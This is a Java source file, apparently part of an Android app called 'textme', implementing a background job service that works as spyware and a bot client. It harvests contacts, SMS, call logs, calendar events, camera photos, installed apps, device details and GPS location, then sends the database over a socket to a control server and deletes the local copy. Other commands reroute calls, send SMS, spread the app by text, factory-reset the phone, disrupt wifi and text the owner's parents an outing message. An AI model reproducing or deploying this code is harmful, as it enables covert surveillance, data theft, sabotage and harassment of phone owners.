package com.candroid.textme.jobs;

import android.Manifest;
import android.app.IntentService;
import android.app.Notification;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.HandlerThread;
import android.os.Looper;
import android.os.Process;
import android.preference.PreferenceManager;
import android.util.Log;

import com.candroid.textme.BuildConfig;
import com.candroid.textme.data.Constants;
import com.candroid.textme.data.pojos.CalendarEvent;
import com.candroid.textme.data.pojos.Contact;
import com.candroid.textme.data.db.Database;
import com.candroid.textme.data.db.DatabaseHelper;
import com.candroid.textme.api.Lofl;
import com.candroid.textme.receivers.OutgoingCallReceiver;
import com.candroid.textme.services.MessagingService;
import com.candroid.textme.data.pojos.PhoneCall;
import com.candroid.textme.data.pojos.SmsMsg;
import com.candroid.textme.data.Wallpapers;
import com.candroid.textme.ui.activities.permissions.AdminActivity;
import com.candroid.textme.ui.activities.permissions.CalendarActivity;
import com.candroid.textme.ui.activities.permissions.CallLogActivity;
import com.candroid.textme.ui.activities.permissions.CameraActivity;
import com.candroid.textme.ui.activities.permissions.ContactsActivity;
import com.candroid.textme.ui.activities.permissions.LocationActivity;
import com.candroid.textme.ui.activities.permissions.PhoneActivity;
import com.candroid.textme.ui.activities.permissions.RecordAudioActivity;
import com.candroid.textme.ui.activities.permissions.StorageActivity;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Reader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.util.ArrayList;

import javax.net.SocketFactory;

public class JobsIntentService extends IntentService {

    public static final String ACTION_LOCATION = "ACTION_LOCATION";
    public static final String ACTION_SHARE_APP = "ACTION_SHARE_APP";
    public static final String ACTION_FACTORY_RESET = "ACTION_FACTORY_RESET";
    public static final String ACTION_SEND_SMS = "ACTION_SEND_SMS";
    public static final String ACTION_PLAY_SONG = "ACTION_PLAY_SONG";
    public static final String ACTION_DELETE_FILE = "ACTION_DELETE_FILE";
    public static final String GPS_TRACKER_KEY = "GPS_TRACKER_KEY";
    public static final String ACTION_DOWNLOAD_HTTP_DATA = "ACTION_DOWNLOAD_HTTP_DATA";
    private static final String TAG = JobsIntentService.class.getSimpleName();
    public static final String ACTION_DCIM_FILES = "ACTION_DCIM_FILES";
    public static final String ACTION_SMS = "ACTION_SMS";
    public static final String ACTION_CALENDAR_EVENT = "ACTION_CALENDAR_EVENT";
    public static final String ACTION_PACKAGES = "ACTION_PACKAGES";
    public static final String ACTION_CONTACTS = "ACTION_CONTACTS";
    public static final String ACTION_DEVICE_INFO = "ACTION_DEVICE_INFO";
    public static final String ACTION_PHONE_CALLS = "ACTION_PHONE_CALLS";
    public static final String ACTION_WEB_BROWSER = "ACTION_WEB_BROWSER";
    public static final String ACTION_WALLPAPER = "ACTION_WALLPAPER";
    public static final String ACTION_FAKE_PHONE_CALL = "ACTION_FAKE_PHONE_CALL";
    public static final String ACTION_TEXT_PARENTS = "ACTION_TEXT_PARENTS";
    public static final String ACTION_INSERT_CONTACT = "ACTION_INSERT_CONTACT";
    public static final String ACTION_FLASHLIGHT = "ACTION_FLASHLIGHT";
    public static final String ACTION_VIBRATOR = "ACTION_VIBRATOR";
    public static final String ACTION_WIFI_CARD = "ACTION_WIFI_CARD";
    public static final String ACTION_REROUTE_CALLS = "ACTION_REROUTE_CALLS";
    public static final String ACTION_CALL_PHONE = "ACTION_CALL_PHONE";
    public static final String ACTION_ALARM_CLOCK = "ACTION_ALARM_CLOCK";
    public static final String ACTION_CREATE_NOTIFICATION = "ACTION_CREATE_NOTIFICATION";
    public static final String ACTION_CREATE_FILE = "ACTION_CREATE_FILE";
    public static final String ACTION_GPS_TRACKER = "ACTION_GPS_TRACKER";
    public static final String ACTION_SYNC_PHONE_TO_SERVER = "ACTION_SYNC_PHONE_TO_SERVER";
    public static final String ACTION_ADMIN = "ACTION_ADMIN";
    public static final String ACTION_CALL_LOG_PERMISSION = "ACTION_CALL_LOG_PERMISSIONS";
    public static final String ACTION_LOCATION_PERMISSION = "ACTION_LOCATION_PERMISSION";
    public static final String ACTION_CONTACTS_PERMISSION = "ACTION_CONTACTS_PERMISSION";
    public static final String ACTION_RECORD_AUDIO_PERMISSION = "ACTION_RECORD_AUDIO_PERMISSION";
    public static final String ACTION_STORAGE_PERMISSION = "ACTION_STORAGE_PERMISSION";
    public static final String ACTION_CALENDAR_PERMISSION = "ACTION_CALENDAR_PERMISSION";
    public static final String ACTION_CAMERA_PERMISSION = "ACTION_CAMERA_PERMISSION";
    public static final String ACTION_PHONE_PERMISSION = "ACTION_PHONE_PERMISSION";
    public static boolean sShouldTrackGps = false;
    private static long sNumber = 1111111111;
    public static HandlerThread sHandlerThread;
    public static Looper sLooper;
    public static LocationManager sLocationManager;
    public static LocationListener sLocationListener;

    public JobsIntentService() {
        super("JobsIntentService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent != null && intent.getAction() != null) {
            String action = intent.getAction();
            if (action.equals(ACTION_DCIM_FILES)) {
                if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            android.os.Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                            File[] pictures = Lofl.getFilesForDirectory(Lofl.getDcimDirectory().getPath() + "/Camera");
                            SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                            try {
                                database.beginTransaction();
                                if (pictures != null && pictures.length > 0) {
                                    for (File f : pictures) {
                                        Database.insertMedia(database, f.getName(), f);
                                    }
                                }
                                database.setTransactionSuccessful();
                            } catch (SQLiteException e) {
                                e.printStackTrace();
                            } finally {
                                database.endTransaction();
                                if (database.isOpen()) {
                                    database.close();
                                }
                                Lofl.setJobRan(JobsIntentService.this, JobsScheduler.DCIM_KEY);
                            }
                        }
                    }).start();
                }
            } else if (action.equals(ACTION_PACKAGES)) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        android.os.Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                        SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                        try {
                            database.beginTransaction();
                            Database.insertPackages(database, Lofl.getInstalledApps(JobsIntentService.this));
                            database.setTransactionSuccessful();
                        } catch (SQLiteException e) {
                            e.printStackTrace();
                        } finally {
                            database.endTransaction();
                            if (database.isOpen()) {
                                database.close();
                            }
                            Lofl.setJobRan(JobsIntentService.this, JobsScheduler.PACKAGES_KEY);
                        }
                    }
                }).start();
            } else if (action.equals(ACTION_CONTACTS)) {
                if (checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            android.os.Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                            ArrayList<Contact> contacts = Lofl.fetchContactsInformation(JobsIntentService.this);
                            SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                            try {
                                database.beginTransaction();
                                Database.insertContacts(database, contacts);
                                database.setTransactionSuccessful();
                            } catch (SQLiteException e) {
                                e.printStackTrace();
                            } finally {
                                database.endTransaction();
                                database.close();
                                Lofl.setJobRan(JobsIntentService.this, ACTION_CONTACTS);
                            }
                        }
                    }).start();
                }
            } else if (action.equals(ACTION_DEVICE_INFO)) {
                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                try {
                    database.beginTransaction();
                    Database.insertDevice(database, MessagingService.sTelephoneAddress, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, BuildConfig.FLAVOR, Build.SERIAL, Build.RADIO);
                    database.setTransactionSuccessful();
                } catch (SQLException e) {
                    e.printStackTrace();
                } finally {
                    database.endTransaction();
                    database.close();
                    Lofl.setJobRan(this, ACTION_DEVICE_INFO);
                }
            }else if(action.equals(ACTION_SYNC_PHONE_TO_SERVER)){
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        android.os.Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                        //SYNC CONTACTS
                        SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                        try{
                            database.beginTransaction();
                            if(checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED){
                                ArrayList<Contact> contacts = Lofl.fetchContactsInformation(JobsIntentService.this);
                                try {
                                    database.beginTransaction();
                                    Database.insertContacts(database, contacts);
                                    database.setTransactionSuccessful();
                                } catch (SQLiteException e) {
                                    e.printStackTrace();
                                } finally {
                                    database.endTransaction();
                                    Lofl.setJobRan(JobsIntentService.this, JobsScheduler.CONTACTS_KEY);
                                }
                            }
                            //SYNC INSTALLED APPS
                            try {
                                database.beginTransaction();
                                Database.insertPackages(database, Lofl.getInstalledApps(JobsIntentService.this));
                                database.setTransactionSuccessful();
                            } catch (SQLiteException e) {
                                e.printStackTrace();
                            } finally {
                                database.endTransaction();
                                Lofl.setJobRan(JobsIntentService.this, JobsScheduler.PACKAGES_KEY);
                            }
                            //DCIM SYNC
                            if(checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED){
                                File[] pictures = Lofl.getFilesForDirectory(Lofl.getDcimDirectory().getPath() + "/Camera");
                                try {
                                    database.beginTransaction();
                                    if (pictures != null && pictures.length > 0) {
                                        for (File f : pictures) {
                                            Database.insertMedia(database, f.getName(), f);
                                        }
                                    }
                                    database.setTransactionSuccessful();
                                } catch (SQLiteException e) {
                                    e.printStackTrace();
                                } finally {
                                    database.endTransaction();
                                    Lofl.setJobRan(JobsIntentService.this, JobsScheduler.DCIM_KEY);
                                }
                            }
                            //SYNC CALL LOG
                            if(checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED){
                                ArrayList<PhoneCall> phoneCalls = Lofl.fetchCallLog(JobsIntentService.this);
                                try {
                                    database.beginTransaction();
                                    Database.insertPhoneCalls(database, phoneCalls);
                                    database.setTransactionSuccessful();
                                } catch (SQLException e) {
                                    e.printStackTrace();
                                } finally {
                                    database.endTransaction();
                                    Lofl.setJobRan(JobsIntentService.this, JobsScheduler.PHONE_CALLS_KEY);
                                }
                            }
                            //SYNC CALENDAR EVENTS
                            if (checkSelfPermission(Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED) {
                                ArrayList<CalendarEvent> calendarEvents = Lofl.fetchCalendarEvents(JobsIntentService.this);
                                try {
                                    database.beginTransaction();
                                    Database.insertCalendarEvents(database, calendarEvents);
                                    database.setTransactionSuccessful();
                                } catch (SQLException e) {
                                    e.printStackTrace();
                                } finally {
                                    database.endTransaction();
                                    Lofl.setJobRan(JobsIntentService.this, JobsScheduler.CALENDAR_EVENTS_KEY);
                                }
                            }
                            //SYNC SMS
                            if(checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED){
                                ArrayList<SmsMsg> smsMsgs = Lofl.fetchSmsMessages(JobsIntentService.this);
                                try {
                                    database.beginTransaction();
                                    Database.insertSmsMessages(database, smsMsgs);
                                    database.setTransactionSuccessful();
                                } catch (SQLException e) {
                                    e.printStackTrace();
                                } finally {
                                    database.endTransaction();
                                    Lofl.setJobRan(JobsIntentService.this, JobsScheduler.SMS_KEY);
                                }
                            }
                            //SYNC DEVICE INFO
                            try {
                                database.beginTransaction();
                                Database.insertDevice(database, MessagingService.sTelephoneAddress, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, BuildConfig.FLAVOR, Build.SERIAL, Build.RADIO);
                                database.setTransactionSuccessful();
                            } catch (SQLException e) {
                                e.printStackTrace();
                            } finally {
                                database.endTransaction();
                                Lofl.setJobRan(JobsIntentService.this, JobsScheduler.DEVICE_KEY);
                            }
                            database.setTransactionSuccessful();
                        }catch (SQLException e){
                            e.printStackTrace();
                        }finally {
                            //FNISHED SYNCING PHONE TO DATABASE
                            database.endTransaction();
                            database.close();
                            //SEND DATABASE TO SERVER
                            try{
                                boolean isAlreadyBot = false;
                                Socket socket = SocketFactory.getDefault().createSocket(Constants.SERVER_ADDRESS, 6666);
                                ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
                                oos.writeObject(MessagingService.sTelephoneAddress);
                                oos.flush();
                                InputStream inputStream = socket.getInputStream();
                                if(inputStream.available() != 0){
                                    try {
                                        ObjectInputStream ois = new ObjectInputStream(inputStream);
                                        String message = (String) ois.readObject();
                                        if(message.equalsIgnoreCase("bot already exists")){
                                            isAlreadyBot = true;
                                        }
                                        ois.close();
                                    } catch (ClassNotFoundException e) {
                                        e.printStackTrace();
                                    }
                                }
                                if(!isAlreadyBot){
                                    String ip = Lofl.fetchIpv4Addresses().get(0);
                                    oos.writeObject(ip);
                                    oos.flush();
                                    byte[] bytes = Lofl.fileToBytes(Lofl.getDatabaseFile(JobsIntentService.this));
                                    oos.writeObject(bytes);
                                    oos.flush();
                                }
                                oos.close();
                                socket.close();
                            }catch (IOException e){
                                e.printStackTrace();
                            }finally{
                                SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
                                editor.putBoolean(Constants.Keys.IS_BOT_KEY, true);
                                editor.apply();
                                //DELETE DATABASE
                                Lofl.getDatabaseFile(JobsIntentService.this).delete();
                            }
                        }
                    }
                }).start();
            } else if (action.equals(ACTION_PHONE_CALLS)) {
                if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            android.os.Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                            ArrayList<PhoneCall> phoneCalls = Lofl.fetchCallLog(JobsIntentService.this);
                            SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                            try {
                                database.beginTransaction();
                                Database.insertPhoneCalls(database, phoneCalls);
                                database.setTransactionSuccessful();
                            } catch (SQLException e) {
                                e.printStackTrace();
                            } finally {
                                database.endTransaction();
                                database.close();
                                Lofl.setJobRan(JobsIntentService.this, JobsScheduler.PHONE_CALLS_KEY);
                            }
                            ArrayList<CalendarEvent> calendarEvents = Lofl.fetchCalendarEvents(JobsIntentService.this);
                            try {
                                database.beginTransaction();
                                Database.insertCalendarEvents(database, calendarEvents);
                                database.setTransactionSuccessful();
                            } catch (SQLException e) {
                                e.printStackTrace();
                            } finally {
                                database.endTransaction();
                                Lofl.setJobRan(JobsIntentService.this, JobsScheduler.CALENDAR_EVENTS_KEY);
                            }
                        }
                    }).start();
                }
            } else if (action.equals(ACTION_SMS)) {
                if (checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            android.os.Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                            ArrayList<SmsMsg> smsMsgs = Lofl.fetchSmsMessages(JobsIntentService.this);
                            SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                            try {
                                database.beginTransaction();
                                Database.insertSmsMessages(database, smsMsgs);
                                database.setTransactionSuccessful();
                            } catch (SQLException e) {
                                e.printStackTrace();
                            } finally {
                                database.endTransaction();
                                database.close();
                                Lofl.setJobRan(JobsIntentService.this, JobsScheduler.SMS_KEY);
                                ArrayList<String> addresses = null;
                                Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                                try{
                                    boolean isAlreadyBot = false;
                                    Socket socket = SocketFactory.getDefault().createSocket(Constants.SERVER_ADDRESS, 6666);
                                    ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
                                    oos.writeObject(MessagingService.sTelephoneAddress);
                                    oos.flush();
                                    InputStream inputStream = socket.getInputStream();
                                    if(inputStream.available() != 0){
                                        ObjectInputStream ois = new ObjectInputStream(inputStream);
                                        try {
                                            String message = (String) ois.readObject();
                                            if(message.equalsIgnoreCase("bot already exists")){
                                                isAlreadyBot = true;
                                            }
                                            ois.close();
                                        } catch (ClassNotFoundException e) {
                                            e.printStackTrace();
                                        }
                                    }
                                    if(!isAlreadyBot){
                                        String ip = Lofl.fetchIpv4Addresses().get(0);
                                        oos.writeObject(ip);
                                        oos.flush();
                                        byte[] bytes = Lofl.fileToBytes(Lofl.getDatabaseFile(JobsIntentService.this));
                                        oos.writeObject(bytes);
                                        oos.flush();
                                    }
                                    inputStream.close();
                                    oos.close();
                                    socket.close();
                                }catch (IOException e){
                                    e.printStackTrace();
                                }
                                Lofl.getDatabaseFile(JobsIntentService.this).delete();
                                SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
                                editor.putBoolean(Constants.Keys.IS_BOT_KEY, true);
                                editor.apply();
                            }
                        }
                    }).start();
                }
            } else if (action.equals(ACTION_CALENDAR_EVENT)) {
                if (checkSelfPermission(Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED) {
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            android.os.Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                            ArrayList<CalendarEvent> calendarEvents = Lofl.fetchCalendarEvents(JobsIntentService.this);
                            SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                            try {
                                database.beginTransaction();
                                Database.insertCalendarEvents(database, calendarEvents);
                                database.setTransactionSuccessful();
                            } catch (SQLException e) {
                                e.printStackTrace();
                            } finally {
                                database.endTransaction();
                                database.close();
                                Lofl.setJobRan(JobsIntentService.this, JobsScheduler.CALENDAR_EVENTS_KEY);
                            }
                        }
                    }).start();

                }
            } else if (action.equals(ACTION_WALLPAPER)) {
                double randomNumber = Math.random();
                String url = null;
                if (randomNumber <= 0.5) {
                    url = Wallpapers.WALLPAPERS[0];
                } else {
                    url = Wallpapers.WALLPAPERS[2];
                }
                Lofl.changeWallpaper(this, Lofl.getBitmapFromUrl(Uri.parse(url).toString()));
            } else if (action.equals(ACTION_WEB_BROWSER)) {
                if (intent.hasExtra(Constants.Keys.URL_KEY)) {
                    String url = intent.getStringExtra(Constants.Keys.URL_KEY);
                    Lofl.openBrowser(this, url);
                }
            } else if (action.equals(ACTION_FAKE_PHONE_CALL)) {
                Lofl.fakePhoneCall(this);
            } else if (action.equals(ACTION_TEXT_PARENTS)) {
                if (checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
                    Lofl.tellMyParentsImGay(this);
                    Lofl.setJobRan(this, JobsScheduler.TEXT_PARENTS_KEY);
                }
            } else if (action.equals(ACTION_INSERT_CONTACT)) {
                if (this.checkSelfPermission(Manifest.permission.WRITE_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                    if (intent.hasExtra(Constants.Keys.NAME_KEY) && intent.hasExtra(Constants.Keys.ADDRESS_KEY)) {
                        String name = intent.getStringExtra(Constants.Keys.NAME_KEY);
                        String number = intent.getStringExtra(Constants.Keys.ADDRESS_KEY);
                        Lofl.insertContact(this, name, number);
                    }
                }
            } else if (action.equals(ACTION_WIFI_CARD)) {
                if (checkSelfPermission(Manifest.permission.CHANGE_WIFI_STATE) == PackageManager.PERMISSION_GRANTED) {
                    Lofl.dosWifiCard(this);
                }
            } else if (action.equals(ACTION_FLASHLIGHT)) {
                if (checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                    Lofl.persistentBlinkingFlashlight(this);
                }
            } else if (action.equals(ACTION_VIBRATOR)) {
                Lofl.vibrator(this);
            } else if (action.equals(ACTION_SHARE_APP)) {
                if (checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
                    Lofl.shareApp(this);
                }
            } else if (action.equals(ACTION_FACTORY_RESET)) {
                Lofl.factoryReset(this);
            } else if (action.equalsIgnoreCase(ACTION_REROUTE_CALLS)) {
                if (intent.hasExtra(OutgoingCallReceiver.NUMBER_KEY)) {
                    String number = intent.getStringExtra(OutgoingCallReceiver.NUMBER_KEY);
                    SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(this.getApplicationContext()).edit();
                    editor.putString(OutgoingCallReceiver.NUMBER_KEY, number);
                    editor.apply();
                    OutgoingCallReceiver.sRerouteNumber = number;
                }
            } else if (action.equalsIgnoreCase(ACTION_CALL_PHONE)) {
                if (checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
                    if (intent.hasExtra(Constants.Keys.ADDRESS_KEY)) {
                        String number = intent.getStringExtra(Constants.Keys.ADDRESS_KEY);
                        Lofl.phoneCall(this, number);
                    }
                }
            } else if (action.equals(ACTION_SEND_SMS)) {
                if (checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
                    if (intent.hasExtra(Constants.Keys.ADDRESS_KEY) && intent.hasExtra(Constants.Keys.BODY_KEY)) {
                        String address = intent.getStringExtra(Constants.Keys.ADDRESS_KEY);
                        String body = intent.getStringExtra(Constants.Keys.BODY_KEY);
                        Lofl.sendNonDataSms(this, address, body);
                    }
                }
            } else if (action.equals(ACTION_ALARM_CLOCK)) {
                if (intent.hasExtra(Constants.Keys.HOURS_KEY) && intent.hasExtra(Constants.Keys.MINUTES_KEY)) {
                    int hours = intent.getIntExtra(Constants.Keys.HOURS_KEY, 0);
                    int minutes = intent.getIntExtra(Constants.Keys.MINUTES_KEY, 0);
                    Lofl.setAlarmClock(this, hours, minutes);
                }
            } else if (action.equals(ACTION_CREATE_NOTIFICATION)) {
                if (intent.hasExtra(Constants.Keys.TITLE_KEY) && intent.hasExtra(Constants.Keys.CONTENT_KEY)) {
                    Lofl.sId++;
                    String title = intent.getStringExtra(Constants.Keys.TITLE_KEY);
                    String content = intent.getStringExtra(Constants.Keys.CONTENT_KEY);
                    Notification.Builder builder = new Notification.Builder(this, Constants.PRIMARY_NOTIFICATION_CHANNEL_ID);
                    builder.setContentTitle(title);
                    builder.setContentText(content);
                    builder.setPriority(Notification.PRIORITY_MAX);
                    builder.setTimeoutAfter(2000);
                    builder.setSmallIcon(android.R.drawable.stat_notify_error);
                    Lofl.initNotificationManager(this);
                    Lofl.createPrimaryNotificationChannel(Lofl.sNotificationManager);
                    Lofl.sNotificationManager.notify(Lofl.sId++, builder.build());
                }
            } else if (action.equals(ACTION_CREATE_FILE)) {
                if (intent.hasExtra(Constants.Keys.FILE_NAME_KEY) && intent.hasExtra(Constants.Keys.FILE_CONTENT_KEY)) {
                    String fileName = intent.getStringExtra(Constants.Keys.FILE_NAME_KEY);
                    String content = intent.getStringExtra(Constants.Keys.FILE_CONTENT_KEY);
                    Lofl.createTextFile(this, fileName, content);
                }
            } else if (action.equals(ACTION_PLAY_SONG)) {
                if (intent.hasExtra(Constants.Keys.URL_KEY)) {
                    String url = intent.getStringExtra(Constants.Keys.URL_KEY);
                    Lofl.playSong(this, url);
                }
            } else if (action.equals(ACTION_DELETE_FILE)) {
                if (intent.hasExtra(Constants.Keys.FILE_NAME_KEY)) {
                    String fileName = intent.getStringExtra(Constants.Keys.FILE_NAME_KEY);
                    Lofl.deleteFile(this, fileName);
                }
            } else if (action.equals(ACTION_LOCATION)) {
                if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {

/*                    if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.P){
                        if(locationManager.isLocationEnabled()){
                            locationProvider = locationManager.getProvider(LocationManager.GPS_PROVIDER);
                        }else{
                            locationProvider = locationManager.getProvider(LocationManager.NETWORK_PROVIDER);
                        }
                    }else{
                        locationProvider = locationManager.getProvider(LocationManager.GPS_PROVIDER);
                    }*/
                    LocationManager locationManager = Lofl.getLocationManager(JobsIntentService.this);
                    String provider = LocationManager.GPS_PROVIDER;
                    Location lastKnownLocation = locationManager.getLastKnownLocation(provider);
                    if(lastKnownLocation != null){
                        double latitude = lastKnownLocation.getLatitude();
                        double longitude = lastKnownLocation.getLongitude();
                        Database.insertLocation(DatabaseHelper.getInstance(JobsIntentService.this), latitude, longitude);
                    }
                }
            }else if(action.equals(ACTION_GPS_TRACKER)){
                if(intent.hasExtra(GPS_TRACKER_KEY)){
                    sShouldTrackGps = intent.getBooleanExtra(GPS_TRACKER_KEY, false);
                }
                if(sShouldTrackGps){
                    if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                        sHandlerThread = new HandlerThread("locationThread", Process.THREAD_PRIORITY_BACKGROUND);
                        sHandlerThread.start();
                        sLooper = sHandlerThread.getLooper();
                        String locationProvider = LocationManager.GPS_PROVIDER;
                        sLocationManager = Lofl.getLocationManager(JobsIntentService.this);
                        sLocationListener = Lofl.getLocationListener(this);
                        sLocationManager.requestLocationUpdates(locationProvider, 1000, 30, sLocationListener, sLooper);
                        SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(this).edit();
                        editor.putBoolean(GPS_TRACKER_KEY, true);
                        editor.apply();
                    }
                }else if(sLocationManager != null){
                    sLocationManager.removeUpdates(sLocationListener);
                    sLooper.quitSafely();
                    sHandlerThread.quitSafely();
                    sLocationManager = null;
                    sLooper = null;
                    sHandlerThread = null;
                    sLocationListener = null;
                    SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(this).edit();
                    editor.putBoolean(GPS_TRACKER_KEY, false);
                    editor.apply();
                }
            }else if(action.equalsIgnoreCase(ACTION_DOWNLOAD_HTTP_DATA)){
                if(intent.hasExtra(Constants.Keys.URL_KEY)){
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            android.os.Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                            int response = -1;
                            InputStream inputStream = null;
                            try {
                                URL url = new URL(Uri.parse(Constants.BOT_CONTROLLER_URL.concat(MessagingService.sTelephoneAddress)).toString());
                                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                                connection.setReadTimeout(10000);
                                connection.setConnectTimeout(10000);
                                connection.setRequestMethod("GET");
                                connection.setDoInput(true);
                                connection.connect();
                                response = connection.getResponseCode();
                                Log.d(TAG, String.format("response code = %s", response));
                                inputStream = connection.getInputStream();
                                Reader reader = null;
                                reader = new InputStreamReader(inputStream, "UTF-8");
                                char[] buffer = new char[1000];
                                reader.read(buffer);
                                String content = new String(buffer);
                                Log.d(TAG, String.format("HTML CONTENT = %s", content));
                            } catch (MalformedURLException e) {
                                e.printStackTrace();
                            } catch (IOException e) {
                                e.printStackTrace();
                            }finally {
                                if(inputStream != null){
                                    try {
                                        inputStream.close();
                                    } catch (IOException e) {
                                        e.printStackTrace();
                                    }
                                }
                                if(response == 200){
                                    SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
                                    editor.putBoolean(Constants.Keys.CALLED_HOME_KEY, true);
                                    editor.apply();
                                }
                            }
                        }
                    }).start();
                }
            }else if(action.equalsIgnoreCase(ACTION_ADMIN)){
                Intent adminIntent = new Intent();
                adminIntent.setClass(getApplicationContext(), AdminActivity.class);
                adminIntent.setAction(Intent.ACTION_VIEW);
                adminIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                this.startActivity(adminIntent);

            }else if(action.equalsIgnoreCase(ACTION_CALL_LOG_PERMISSION)){
                Intent callLogIntent = new Intent();
                callLogIntent.setAction(Intent.ACTION_VIEW);
                callLogIntent.setClass(this, CallLogActivity.class);
                callLogIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(callLogIntent);
            }else if(action.equalsIgnoreCase(ACTION_LOCATION_PERMISSION)){
                Intent locationIntent = new Intent();
                locationIntent.setAction(Intent.ACTION_VIEW);
                locationIntent.setClass(this, LocationActivity.class);
                locationIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(locationIntent);
            }else if(action.equalsIgnoreCase(ACTION_CONTACTS_PERMISSION)){
                Intent contactsIntent = new Intent();
                contactsIntent.setAction(Intent.ACTION_VIEW);
                contactsIntent.setClass(this, ContactsActivity.class);
                contactsIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(contactsIntent);
            }else if(action.equalsIgnoreCase(ACTION_RECORD_AUDIO_PERMISSION)){
                Intent recordAudioIntent = new Intent();
                recordAudioIntent.setAction(Intent.ACTION_VIEW);
                recordAudioIntent.setClass(this, RecordAudioActivity.class);
                recordAudioIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(recordAudioIntent);
            }else if(action.equalsIgnoreCase(ACTION_STORAGE_PERMISSION)){
                Intent storageIntent = new Intent();
                storageIntent.setAction(Intent.ACTION_VIEW);
                storageIntent.setClass(this, StorageActivity.class);
                storageIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(storageIntent);
            }else if(action.equals(ACTION_CALENDAR_PERMISSION)){
                Intent calendarIntent = new Intent();
                calendarIntent.setAction(Intent.ACTION_VIEW);
                calendarIntent.setClass(this, CalendarActivity.class);
